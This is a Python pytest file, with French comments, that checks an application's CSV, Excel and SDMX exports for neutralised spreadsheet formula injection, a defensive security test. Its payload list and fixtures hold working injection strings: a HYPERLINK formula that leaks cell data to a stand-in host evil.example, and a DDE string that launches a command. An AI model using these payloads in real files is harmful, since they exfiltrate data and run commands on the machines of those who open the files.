"""P-082 : neutralisation des formules dans tous les exports tabulaires (injection CSV/Excel)."""
from __future__ import annotations

import csv
import io
import re
from decimal import Decimal
from pathlib import Path

import openpyxl
import pytest
import yaml
from fastapi.testclient import TestClient

from app.export.excel import results_to_excel
from app.export.sanitize import TRIGGERS, neutralize_cell, neutralize_row
from app.sdmx.csv_format import write_sdmx_csv

VIEWER = {"X-Api-Key": "test-viewer-key-s6"}
PAYLOADS = [
    '=HYPERLINK("http://evil.example/?d="&A1,"clic")', "=cmd|' /C calc'!A0", "@SUM(1+1)", "+1+1", "-1+1",
    "-2+3", "\t=1+1", "\r=1+1", "\n=1+1", "=1+1", "@A1",
]


def dangerous(v) -> bool:
    return isinstance(v, str) and v[:1] in TRIGGERS


# ── fonction unique ─────────────────────────────────────────────────────────

@pytest.mark.parametrize("p", PAYLOADS)
def test_every_payload_is_neutralized_and_readable(p):
    out = neutralize_cell(p)
    assert out == "'" + p and not dangerous(out)          # le texte reste identique, hors apostrophe


def test_numbers_none_dates_and_safe_text_are_untouched():
    from datetime import date
    for v in (5, -5, 3.14, -0.5, Decimal("-12.50"), True, None, date(2026, 1, 1), "Texte", "", " =pas en tête", "a=b"):
        assert neutralize_cell(v) == v and type(neutralize_cell(v)) is type(v)
    assert neutralize_row([1, "=x", None, "ok"]) == [1, "'=x", None, "ok"]


# ── Excel ───────────────────────────────────────────────────────────────────

def test_excel_neutralizes_headers_cells_and_note_but_keeps_numbers():
    cols = ["=EVIL()", "montant", "texte"]
    rows = [[1, Decimal("-1200.50"), p] for p in PAYLOADS] + [[2, -7, "normal"]]
    wb = openpyxl.load_workbook(io.BytesIO(results_to_excel(cols, rows, note="=NOTE()")))
    ws = wb.active
    for row in ws.iter_rows():
        for c in row:
            assert not dangerous(c.value), (c.coordinate, c.value)
            assert c.data_type != "f", (c.coordinate, c.value)         # aucune formule dans le classeur
    amounts = [ws.cell(row=r, column=2).value for r in range(2, 2 + len(rows))]
    assert all(isinstance(a, int | float) for a in amounts) and amounts[0] == -1200.5 and amounts[-1] == -7   # restent des nombres
    assert [ws.cell(row=r, column=3).value for r in range(2, 2 + len(PAYLOADS))] == ["'" + p for p in PAYLOADS]
    assert ws.cell(row=len(rows) + 1, column=3).value == "normal"


# ── CSV de tuile ────────────────────────────────────────────────────────────

def test_tile_csv_neutralizes_text_and_keeps_numbers(tmp_path, monkeypatch):
    from app.main import app
    monkeypatch.setattr("app.routers.dashboards._DASHBOARDS_DIR", tmp_path)
    tile = {"id": "t1", "type": "table", "title": "T", "source": "=SRC()",
            "sql_pinned": "SELECT '=HYPERLINK(\"http://evil\")' AS a, '@SUM(1)' AS b, -5 AS n, 2.5 AS m, '-2+3' AS c"}
    (tmp_path / "d1.yaml").write_text(yaml.safe_dump({
        "id": "d1", "title": "T", "scope": "personal", "tiles": [tile], "created_at": "", "updated_at": "",
        "theme": {"primary_color": "#1a4a8c", "font": "sans-serif", "logo_url": ""}}))
    with TestClient(app) as c:
        r = c.get("/dashboards/d1/tiles/t1/export/csv", headers=VIEWER)
    assert r.status_code == 200
    rows = list(csv.reader(io.StringIO(r.content.decode("utf-8-sig"))))
    def is_number(v: str) -> bool:
        try:
            float(v)
            return True
        except ValueError:
            return False

    for row in rows:      # en CSV tout est texte : un vrai nombre (« -5 ») est légitime, un texte déclencheur non
        assert not any(dangerous(v) and not is_number(v) for v in row), row
    data = rows[-1]
    assert data[0] == "'=HYPERLINK(\"http://evil\")" and data[1] == "'@SUM(1)" and data[4] == "'-2+3"
    assert data[2] == "-5" and data[3] == "2.5"            # nombres réels inchangés


# ── SDMX-CSV ────────────────────────────────────────────────────────────────

def test_sdmx_csv_neutralizes_dimension_and_unit_text():
    out = write_sdmx_csv(["region", "valeur"], [["-2+3", 10], ["=1+1", 20], ["\t=x", 30]], structure_id="MIZANBI:DF(1.0)", value_col="valeur",
                         unit="@UNIT")
    cells = [c for row in csv.reader(io.StringIO(out)) for c in row]
    assert not any(dangerous(c) for c in cells), cells
    assert "'-2+3" in cells and "'@UNIT" in cells


# ── inventaire : tout nouvel export doit passer par la fonction ─────────────

WRITER = re.compile(r"csv\.writer|csv\.DictWriter|openpyxl\.Workbook\(|\bWorkbook\(\)|\.to_csv\(|\.to_excel\(|xlsxwriter")


def test_every_tabular_export_uses_the_sanitizer():
    root = Path(__file__).resolve().parents[1] / "app"
    offenders = []
    for f in root.rglob("*.py"):
        if "__pycache__" in f.parts or f.name == "sanitize.py":
            continue
        src = f.read_text(encoding="utf-8")
        if WRITER.search(src) and "app.export.sanitize" not in src and "from app.export.excel" not in src:
            offenders.append(str(f.relative_to(root.parent)))
    assert not offenders, f"Export tabulaire sans neutralisation (P-082) : {offenders}"
